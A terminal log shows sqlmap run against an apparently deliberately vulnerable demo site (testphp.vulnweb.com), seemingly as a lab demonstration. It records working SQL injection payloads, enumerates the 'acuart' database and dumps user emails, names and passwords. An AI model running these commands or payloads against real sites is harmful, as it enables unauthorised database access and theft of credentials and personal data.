root@osboxes:~# sqlmap -h
Usage: python sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -g GOOGLEDORK       Process Google dork results as target URLs

  Request:
    These options can be used to specify how to connect to the target URL

    --data=DATA         Data string to be sent through POST
    --cookie=COOKIE     HTTP Cookie header value
    --random-agent      Use randomly selected HTTP User-Agent header value
    --proxy=PROXY       Use a proxy to connect to the target URL
    --tor               Use Tor anonymity network
    --check-tor         Check to see if Tor is used properly

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --dbms=DBMS         Force back-end DBMS to this value

  Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH    SQL injection techniques to use (default "BEUSTQ")

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables. Moreover you can run your own SQL statements

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --passwords         Enumerate DBMS users password hashes
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC

  General:
    These options can be used to set some general working parameters

    --batch             Never ask for user input, use the default behaviour
    --flush-session     Flush session files for current target

  Miscellaneous:
    --sqlmap-shell      Prompt for an interactive sqlmap shell
    --wizard            Simple wizard interface for beginner users

[!] to see full list of options run with '-hh'
root@osboxes:~# sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1
         _
 ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150917}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 12:22:56

[12:22:57] [WARNING] using '/root/.sqlmap/output' as the output directory
[12:22:58] [INFO] testing connection to the target URL
[12:23:00] [INFO] testing if the target URL is stable
[12:23:01] [INFO] target URL is stable
[12:23:01] [INFO] testing if GET parameter 'cat' is dynamic
[12:23:01] [INFO] confirming that GET parameter 'cat' is dynamic
[12:23:02] [INFO] GET parameter 'cat' is dynamic
[12:23:02] [INFO] heuristic (basic) test shows that GET parameter 'cat' might be injectable (possible DBMS: 'MySQL')
[12:23:03] [INFO] heuristic (XSS) test shows that GET parameter 'cat' might be vulnerable to XSS attacks
[12:23:03] [INFO] testing for SQL injection on GET parameter 'cat'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[12:24:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:24:02] [WARNING] reflective value(s) found and filtering out
[12:24:04] [INFO] GET parameter 'cat' seems to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[12:24:04] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
[12:24:04] [INFO] GET parameter 'cat' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable 
[12:24:04] [INFO] testing 'MySQL inline queries'
[12:24:05] [INFO] testing 'MySQL > 5.0.11 stacked queries (SELECT - comment)'
[12:24:05] [WARNING] time-based comparison requires larger statistical model, please wait..................
[12:24:18] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
[12:24:19] [INFO] testing 'MySQL > 5.0.11 stacked queries (SELECT)'
[12:24:20] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
[12:24:20] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[12:24:21] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[12:24:21] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[12:24:25] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SELECT)'
[12:24:40] [INFO] GET parameter 'cat' seems to be 'MySQL >= 5.0.12 AND time-based blind (SELECT)' injectable 
[12:24:40] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[12:24:40] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[12:24:42] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[12:24:45] [INFO] target URL appears to have 11 columns in query
[12:24:51] [INFO] GET parameter 'cat' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N] Y
sqlmap identified the following injection point(s) with a total of 45 HTTP(s) requests:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 6304=6304

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: cat=1 AND (SELECT 6900 FROM(SELECT COUNT(*),CONCAT(0x71707a6271,(SELECT (ELT(6900=6900,1))),0x7171627a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
    Payload: cat=1 AND (SELECT * FROM (SELECT(SLEEP(5)))Aioz)

    Type: UNION query
    Title: Generic UNION query (NULL) - 11 columns
    Payload: cat=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71707a6271,0x7878694d6b564e4e6a67,0x7171627a71),NULL,NULL,NULL,NULL-- 
---
[12:27:01] [INFO] the back-end DBMS is MySQL
web application technology: Nginx, PHP 5.3.10
back-end DBMS: MySQL 5.0
[12:27:01] [INFO] fetched data logged to text files under '/root/.sqlmap/output/testphp.vulnweb.com'

[*] shutting down at 12:27:01

root@osboxes:~# sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1--dbs         _
 ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150917}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 12:27:45

[12:27:46] [INFO] resuming back-end DBMS 'mysql' 
[12:27:46] [INFO] testing connection to the target URL
[12:27:50] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 6304=6304

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: cat=1 AND (SELECT 6900 FROM(SELECT COUNT(*),CONCAT(0x71707a6271,(SELECT (ELT(6900=6900,1))),0x7171627a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
    Payload: cat=1 AND (SELECT * FROM (SELECT(SLEEP(5)))Aioz)

    Type: UNION query
    Title: Generic UNION query (NULL) - 11 columns
    Payload: cat=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71707a6271,0x7878694d6b564e4e6a67,0x7171627a71),NULL,NULL,NULL,NULL-- 
---
[12:27:51] [INFO] the back-end DBMS is MySQL
web application technology: Nginx, PHP 5.3.10
back-end DBMS: MySQL 5.0
[12:27:51] [INFO] fetched data logged to text files under '/root/.sqlmap/output/testphp.vulnweb.com'

[*] shutting down at 12:27:51

root@osboxes:~# sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
         _
 ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150917}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 12:30:48

[12:30:49] [INFO] resuming back-end DBMS 'mysql' 
[12:30:49] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 6304=6304

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: cat=1 AND (SELECT 6900 FROM(SELECT COUNT(*),CONCAT(0x71707a6271,(SELECT (ELT(6900=6900,1))),0x7171627a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
    Payload: cat=1 AND (SELECT * FROM (SELECT(SLEEP(5)))Aioz)

    Type: UNION query
    Title: Generic UNION query (NULL) - 11 columns
    Payload: cat=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71707a6271,0x7878694d6b564e4e6a67,0x7171627a71),NULL,NULL,NULL,NULL-- 
---
[12:30:51] [INFO] the back-end DBMS is MySQL
web application technology: Nginx, PHP 5.3.10
back-end DBMS: MySQL 5.0
[12:30:51] [INFO] fetching tables for database: 'acuart'
Database: acuart
[8 tables]
+-----------+
| artists   |
| carts     |
| categ     |
| featured  |
| guestbook |
| pictures  |
| products  |
| users     |
+-----------+

[12:30:51] [INFO] fetched data logged to text files under '/root/.sqlmap/output/testphp.vulnweb.com'

[*] shutting down at 12:30:51

root@osboxes:~# sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users --columns
         _
 ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150917}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 12:32:56

[12:32:56] [INFO] resuming back-end DBMS 'mysql' 
[12:32:56] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 6304=6304

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: cat=1 AND (SELECT 6900 FROM(SELECT COUNT(*),CONCAT(0x71707a6271,(SELECT (ELT(6900=6900,1))),0x7171627a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
    Payload: cat=1 AND (SELECT * FROM (SELECT(SLEEP(5)))Aioz)

    Type: UNION query
    Title: Generic UNION query (NULL) - 11 columns
    Payload: cat=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71707a6271,0x7878694d6b564e4e6a67,0x7171627a71),NULL,NULL,NULL,NULL-- 
---
[12:32:57] [INFO] the back-end DBMS is MySQL
web application technology: Nginx, PHP 5.3.10
back-end DBMS: MySQL 5.0
[12:32:57] [INFO] fetching columns for table 'users' in database 'acuart'
Database: acuart
Table: users
[8 columns]
+---------+--------------+
| Column  | Type         |
+---------+--------------+
| address | mediumtext   |
| cart    | varchar(100) |
| cc      | varchar(100) |
| email   | varchar(100) |
| name    | varchar(100) |
| pass    | varchar(100) |
| phone   | varchar(100) |
| uname   | varchar(100) |
+---------+--------------+

[12:32:58] [INFO] fetched data logged to text files under '/root/.sqlmap/output/testphp.vulnweb.com'

[*] shutting down at 12:32:58

root@osboxes:~# sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users -C email,name,pass--dump
         _
 ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150917}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 12:35:06

[12:35:06] [INFO] resuming back-end DBMS 'mysql' 
[12:35:07] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 6304=6304

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: cat=1 AND (SELECT 6900 FROM(SELECT COUNT(*),CONCAT(0x71707a6271,(SELECT (ELT(6900=6900,1))),0x7171627a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
    Payload: cat=1 AND (SELECT * FROM (SELECT(SLEEP(5)))Aioz)

    Type: UNION query
    Title: Generic UNION query (NULL) - 11 columns
    Payload: cat=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71707a6271,0x7878694d6b564e4e6a67,0x7171627a71),NULL,NULL,NULL,NULL-- 
---
[12:35:14] [INFO] the back-end DBMS is MySQL
web application technology: Nginx, PHP 5.3.10
back-end DBMS: MySQL 5.0
[12:35:14] [INFO] fetched data logged to text files under '/root/.sqlmap/output/testphp.vulnweb.com'

[*] shutting down at 12:35:14

root@osboxes:~# sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users -C email,name,pass --dump
         _
 ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150917}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 12:37:09

[12:37:09] [INFO] resuming back-end DBMS 'mysql' 
[12:37:09] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 6304=6304

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: cat=1 AND (SELECT 6900 FROM(SELECT COUNT(*),CONCAT(0x71707a6271,(SELECT (ELT(6900=6900,1))),0x7171627a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
    Payload: cat=1 AND (SELECT * FROM (SELECT(SLEEP(5)))Aioz)

    Type: UNION query
    Title: Generic UNION query (NULL) - 11 columns
    Payload: cat=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71707a6271,0x7878694d6b564e4e6a67,0x7171627a71),NULL,NULL,NULL,NULL-- 
---
[12:37:14] [INFO] the back-end DBMS is MySQL
web application technology: Nginx, PHP 5.3.10
back-end DBMS: MySQL 5.0
[12:37:14] [INFO] fetching columns 'email, name, pass' for table 'users' in database 'acuart'
[12:37:15] [INFO] fetching entries of column(s) 'email, name, pass' for table 'users' in database 'acuart'
[12:37:15] [INFO] analyzing table dump for possible password hashes
Database: acuart
Table: users
[1 entry]
+-----------------+-----------+------+
| email           | name      | pass |
+-----------------+-----------+------+
| email@email.com | HOLLYSTER | test |
+-----------------+-----------+------+

[12:37:15] [INFO] table 'acuart.users' dumped to CSV file '/root/.sqlmap/output/testphp.vulnweb.com/dump/acuart/users.csv'
[12:37:15] [INFO] fetched data logged to text files under '/root/.sqlmap/output/testphp.vulnweb.com'

[*] shutting down at 12:37:15

root@osboxes:~# 

